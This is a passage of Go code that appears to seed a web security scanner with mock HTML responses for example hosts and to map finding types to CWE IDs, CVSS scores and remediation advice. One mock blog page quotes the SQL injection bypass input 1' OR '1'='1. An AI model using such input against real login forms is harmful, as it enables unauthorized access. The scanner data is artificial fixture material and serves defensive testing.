</main>
</body></html>`)

	case path == "/post/hello-world" && ep.method == "GET":
		return []byte(`<!DOCTYPE html>
<html><head><title>Hello World — Blog</title></head>
<body>
<article>
<h1>Hello World</h1>
<time>February 24, 2026</time> <span class="author">by Admin</span>
<div class="content">
<p>Welcome to our security blog! In this first post, we'll cover the fundamentals of web application security testing.</p>
<p>Web security is a critical aspect of modern software development. Understanding common vulnerabilities helps developers build more secure applications.</p>
<h2>Topics We'll Cover</h2>
<ul>
  <li>Cross-Site Scripting (XSS)</li>
  <li>SQL Injection</li>
  <li>Path Traversal</li>
  <li>Authentication Flaws</li>
</ul>
<p>Stay tuned for more in-depth articles on each topic.</p>
</div>
<section class="comments">
  <h3>Comments (4)</h3>
  <div class="comment" id="comment-1"><strong>Alice</strong>: Great post! Very informative introduction.</div>
  <div class="comment" id="comment-2"><strong>Bob</strong>: Looking forward to the SQL injection article.</div>
  <div class="comment" id="comment-3"><strong>Charlie</strong>: Could you also cover CSRF?</div>
  <div class="comment" id="comment-4"><strong>Diana</strong>: Nice overview of the basics.</div>
</section>
</article>
</body></html>`)

	case path == "/post/sql-injection-101":
		return []byte(`<!DOCTYPE html>
<html><head><title>SQL Injection 101 — Blog</title></head>
<body>
<article>
<h1>SQL Injection 101</h1>
<time>February 23, 2026</time> <span class="author">by Admin</span>
<div class="content">
<p>SQL injection (SQLi) is one of the most critical web application vulnerabilities. It occurs when user input is incorporated into SQL queries without proper sanitization.</p>
<h2>How It Works</h2>
<p>Consider a vulnerable query: <code>SELECT * FROM users WHERE id = '$input'</code></p>
<p>An attacker can input <code>1' OR '1'='1</code> to bypass authentication or extract data.</p>
<h2>Prevention</h2>
<ul>
  <li>Use parameterized queries (prepared statements)</li>
  <li>Use ORM frameworks that handle escaping</li>
  <li>Validate and sanitize all user input</li>
  <li>Apply principle of least privilege to database accounts</li>
</ul>
</div>
</article>
</body></html>`)

	case strings.Contains(path, "/comment"):
		return []byte(`<!DOCTYPE html>
<html><head><title>Comment Posted</title></head>
<body><p>Your comment has been posted successfully.</p><a href="/post/hello-world#comment-5">View comment</a></body></html>`)

	case path == "/tag/security":
		return []byte(`<!DOCTYPE html>
<html><head><title>Posts tagged 'security'</title></head>
<body>
<h1>Posts tagged: security</h1>
<ul>
  <li><a href="/post/hello-world">Hello World</a> — February 24, 2026</li>
  <li><a href="/post/sql-injection-101">SQL Injection 101</a> — February 23, 2026</li>
</ul>
</body></html>`)

	// --- legacy.example.com ---
	case path == "/" && strings.Contains(hostPort, "legacy"):
		return []byte(`<html><head><title>Legacy Portal</title></head>
<body bgcolor="#ffffff">
<table width="100%"><tr><td><h1>Legacy Portal</h1></td></tr></table>
<p>Welcome to the legacy application portal. This system is scheduled for migration.</p>
<ul>
<li><a href="/index.php?page=home">Home</a></li>
<li><a href="/index.php?page=about">About</a></li>
<li><a href="/cgi-bin/submit.cgi">Submit Form</a></li>
</ul>
<hr><font size="2">Powered by PHP/5.6</font>
</body></html>`)

	case strings.Contains(path, "/cgi-bin/submit"):
		return []byte(`<html><head><title>Form Submitted</title></head>
<body>
<h1>Form Submitted Successfully</h1>
<p>Thank you for your submission.</p>
<p>Name: test</p>
<p>Value: data</p>
<p><a href="/">Return to portal</a></p>
</body></html>`)

	// --- admin.example.com ---
	case path == "/admin/" || path == "/admin":
		return []byte(`<!DOCTYPE html>
<html><head><title>Admin Panel</title></head>
<body>
<nav><a href="/admin/">Dashboard</a> <a href="/admin/settings">Settings</a> <a href="/admin/logs">Logs</a> <a href="/admin/export">Export</a></nav>
<main>
<h1>Admin Panel</h1>
<div class="stats">
  <div class="stat"><h3>Users</h3><span>156</span></div>
  <div class="stat"><h3>Sessions</h3><span>23</span></div>
  <div class="stat"><h3>Errors (24h)</h3><span>4</span></div>
</div>
<h2>System Status</h2>
<p>Server: admin.example.com:8443</p>
<p>Uptime: 14 days, 6 hours</p>
<p>Database: PostgreSQL 14.2</p>
</main>
</body></html>`)

	case path == "/admin/settings" && ep.method == "GET":
		return []byte(`<!DOCTYPE html>
<html><head><title>Settings — Admin</title></head>
<body>
<nav><a href="/admin/">Dashboard</a> <a href="/admin/settings">Settings</a> <a href="/admin/logs">Logs</a></nav>
<main>
<h1>Server Settings</h1>
<form action="/admin/settings" method="POST">
  <h2>Email (SMTP)</h2>
  <label>SMTP Host: <input type="text" name="smtp_host" value="mail.example.com"></label>
  <label>SMTP Port: <input type="number" name="smtp_port" value="587"></label>
  <h2>Debug</h2>
  <label>Debug Value: <input type="text" name="debug" value=""></label>
  <button type="submit">Save Settings</button>
</form>
</main>
</body></html>`)
	}

	// Generic HTML fallback
	return []byte(fmt.Sprintf(`<!DOCTYPE html>
<html><head><title>%s</title></head>
<body>
<h1>%s</h1>
<p>Page content for %s on %s.</p>
</body></html>`, title, title, path, hostPort))
}

func hashStr(data []byte) string {
	h := sha256.Sum256(data)
	return fmt.Sprintf("%x", h[:16]) // 32 hex chars
}

// moduleClassification maps module IDs to CWE / CVSS / remediation so findings
// can be enriched centrally rather than repeating the info in every seed row.
type moduleClassification struct {
	CWE         string
	CVSS        float64
	Remediation string
}

var findingClassification = map[string]moduleClassification{
	"xss-reflected-param":      {"CWE-79", 6.1, "Context-aware encode user input before rendering into HTML, JS, URL, or CSS sinks. Prefer an auto-escaping template engine."},
	"sqli-union-based":         {"CWE-89", 9.8, "Use parameterized queries or prepared statements. Never build SQL via string concatenation on user input."},
	"sqli-error-based":         {"CWE-89", 8.1, "Use parameterized queries and disable verbose database errors in production responses."},
	"lfi-path-traversal":       {"CWE-22", 8.6, "Canonicalize paths and restrict file access to an allowlist. Reject inputs containing '..' or absolute paths."},
	"ssti-expression-eval":     {"CWE-94", 8.5, "Use sandboxed template engines; never pass untrusted input into templating syntax."},
	"crlf-header-injection":    {"CWE-93", 5.4, "Strip CR/LF characters from any user input used in HTTP response headers or cookies."},
	"open-redirect":            {"CWE-601", 4.3, "Validate redirect destinations against a domain allowlist or use a mapping table of safe targets."},
	"info-server-version":      {"CWE-200", 3.1, "Suppress version banners (Server, X-Powered-By) and upgrade to supported server versions."},
	"info-missing-headers":     {"CWE-693", 0.0, "Add X-Content-Type-Options, X-Frame-Options, and Content-Security-Policy response headers."},
	"info-sensitive-data":      {"CWE-200", 5.3, "Remove sensitive fields (API keys, tokens, secrets) from API response schemas."},
	"backslash-transformation": {"CWE-707", 0.0, "Escape sequence interpretation is a behavioural signal — manually confirm if it points to injection."},
	"suspect-transform":        {"CWE-707", 0.0, "Server-side evaluation of arithmetic expressions is a behavioural signal — confirm with targeted payloads."},
	"smart-behavior-detection": {"CWE-707", 0.0, "Differential timing/response is a behavioural signal — follow up with targeted injection probes."},
}

// enrichFindings hydrates denormalized and classification fields based on the
// referenced HTTP record and the finding's module ID.
func enrichFindings(findings []*database.Finding, records []*database.HTTPRecord) {
	byUUID := make(map[string]*database.HTTPRecord, len(records))
	for _, r := range records {
		byUUID[r.UUID] = r
	}
	for _, f := range findings {
		if len(f.HTTPRecordUUIDs) > 0 {
			if r, ok := byUUID[f.HTTPRecordUUIDs[0]]; ok {
				if f.URL == "" {
					f.URL = r.URL
				}
				if f.Hostname == "" {
					f.Hostname = r.Hostname
				}
				if f.ScanUUID == "" {
					f.ScanUUID = r.ScanUUID
				}
			}
		}
		if c, ok := findingClassification[f.ModuleID]; ok {
			if f.CWEID == "" {
				f.CWEID = c.CWE
			}
			if f.CVSSScore == 0 {
				f.CVSSScore = c.CVSS
			}
			if f.Remediation == "" {
				f.Remediation = c.Remediation
			}
		}
		if f.Status == "" {
			f.Status = database.StatusTriaged
		}
	}
	// Exercise the lifecycle: agent-sourced findings land as draft awaiting
	// triage; the missing-headers passive finding is accepted risk and one
	// behavioural suspect was triaged as a false positive.
	for _, f := range findings {
		switch f.ModuleID {
		case "info-missing-headers":
			f.Status = database.StatusAcceptedRisk
		case "smart-behavior-detection":
			f.Status = database.StatusFalsePositive
		case "sqli-union-based":
			f.Status = database.StatusTriaged
		}
		if f.FindingSource == database.FindingSourceAgent || f.FindingSource == database.FindingSourceArchon {
			f.Status = database.StatusDraft
		}
	}
}
